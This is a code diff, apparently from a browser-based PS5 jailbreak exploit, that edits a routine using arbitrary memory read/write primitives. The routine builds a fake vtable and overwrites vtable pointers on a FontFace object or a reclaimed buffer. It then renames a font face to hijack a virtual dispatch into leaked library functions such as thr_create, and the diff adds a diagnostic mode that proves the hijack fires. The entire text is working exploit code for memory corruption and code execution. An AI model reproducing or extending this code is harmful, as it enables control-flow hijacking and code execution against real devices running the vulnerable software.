@@ -6240,9 +6240,22 @@ function _startWsShell(){
           /* (3) FAKEVT: copy VP-0x10..VP+0x38 (the RTTI precede + 6 slots + NULL), swap s3 (+0x18) */
           var FAKEVT=MBUF+0x4000n;
           for(var cI=0;cI<9;cI++)S.absWrite(FAKEVT+BigInt(cI*8),S.absRead(VP-0x10n+BigInt(cI*8),8)[0]);
-          var s3T=(msg.diag&&msg.diag!=='')?(lkF+0x2C0n):(lkF+0x13ED0n);
-          S.absWrite(FAKEVT+0x18n,s3T);   /* s3 = fontStateChanged (+0x18 PS5-fork): diag=thr_self (the dispatch proof), else thr_create */
-          if(msg.diag&&msg.diag!=='')FB2('D DIAG MODE: s3=lk+0x2C0 (thr_self - the dispatch proof)');
+          var isDiag=(msg.diag&&msg.diag!=='');
+          var isDiag2=(msg.diag==='2');
+          if(isDiag2){
+            /* DIAG2: the FACE dispatch - ALL FAKEVT slots = thr_self;
+             * the swap targets MBUF+0x00 (primary) AND MBUF+0x20 (the
+             * secondary Client vtable - the corpus resolution: the leaked
+             * VP = FontFace's Client SECONDARY at +0x20; the property change
+             * dispatches fontPropertyChanged ON THE FACE = the reclaimed
+             * buffer = MBUF - ZigZagBoi1's exact RIP2 target) */
+            for(var dI=0;dI<8;dI++)S.absWrite(FAKEVT+BigInt(dI*8),lkF+0x2C0n);
+            FB2('D2 DIAG2: all slots=thr_self; the swap = MBUF+0x00 AND +0x20');
+          } else {
+            var s3T=isDiag?(lkF+0x2C0n):(lkF+0x13ED0n);
+            S.absWrite(FAKEVT+0x18n,s3T);
+            if(isDiag)FB2('D DIAG: s3=lk+0x2C0');
+          }
           FB2('4 FAKEVT=0x'+FAKEVT.toString(16)+' s3=0x'+(lkF+0x13ED0n).toString(16));
           /* (4) the witness + the child stack */
           var WIT=MBUF+0x3000n;
@@ -6262,9 +6275,19 @@ function _startWsShell(){
           S.absWrite(FO+0x110n,0x10002n);          /* type */
           S.absWrite(FO+0x118n,0x20001n);          /* subtype */
           FB2('5 gates at FO set, witness=0x'+WIT.toString(16)+' pre=0x'+witPre.toString(16));
-          /* (6) THE SWAP: FO+0x00 := FAKEVT */
-          S.absWrite(FO,FAKEVT);
-          FB2('6 SWAPPED FO.vtable=0x'+FAKEVT.toString(16)+' (was 0x'+vpOrig.toString(16)+')');
+          /* (6) THE SWAP: mode 2 = the FACE (MBUF primary+secondary);
+           * else FO+0x00 */
+          var mb0Pre=0n,mb20Pre=0n;
+          if(isDiag2){
+            mb0Pre=S.absRead(MBUF,8)[0];
+            mb20Pre=S.absRead(MBUF+0x20n,8)[0];
+            S.absWrite(MBUF,FAKEVT);
+            S.absWrite(MBUF+0x20n,FAKEVT);
+            FB2('6 SWAPPED MBUF+0x00 (was 0x'+mb0Pre.toString(16)+') AND +0x20 (was 0x'+mb20Pre.toString(16)+') -> FAKEVT');
+          } else {
+            S.absWrite(FO,FAKEVT);
+            FB2('6 SWAPPED FO.vtable=0x'+FAKEVT.toString(16)+' (was 0x'+vpOrig.toString(16)+')');
+          }
           /* (7) THE TRIGGER: rename a face in document.fonts (the boot's own op) */
           var facesArr=[];
           try{document.fonts.forEach(function(f){facesArr.push(f);});}catch(eD){}
@@ -6278,12 +6301,19 @@ function _startWsShell(){
            * may be synchronous - read immediately too) */
           var witPost=S.absRead(WIT,8)[0];
           FB2('9 witness imm 0x'+witPre.toString(16)+' -> 0x'+witPost.toString(16));
-          if(msg.diag&&msg.diag!==''){
+          if(isDiag2){
+            var mb0Now=S.absRead(MBUF,8)[0];
+            FB2('D2 [MBUF+0] now=0x'+mb0Now.toString(16));
+            reply.MBUF0now='0x'+mb0Now.toString(16);
+            if(mb0Now!==FAKEVT){FB2('D2 *** [MBUF] CHANGED - THE FACE DISPATCH FIRED - tid=0x'+mb0Now.toString(16)+' ***');reply.dispatchProven=true;}
+            S.absWrite(MBUF,mb0Pre);
+            S.absWrite(MBUF+0x20n,mb20Pre);
+            FB2('D2 MBUF vtables restored (0x'+mb0Pre.toString(16)+' / 0x'+mb20Pre.toString(16)+')');
+          } else if(isDiag){
             var foNow=S.absRead(FO,8)[0];
             FB2('D [FO] now=0x'+foNow.toString(16)+' (FAKEVT was 0x'+FAKEVT.toString(16)+')');
             reply.FOnow='0x'+foNow.toString(16);
             if(foNow!==FAKEVT){FB2('D *** [FO] CHANGED - THE DISPATCH FIRED - tid=0x'+foNow.toString(16)+' ***');reply.dispatchProven=true;}
-            /* the restore: FO+0 back to the REAL VP so the engine continues safely */
             S.absWrite(FO,vpOrig);
             FB2('D FO.vtable restored to 0x'+vpOrig.toString(16));
           }
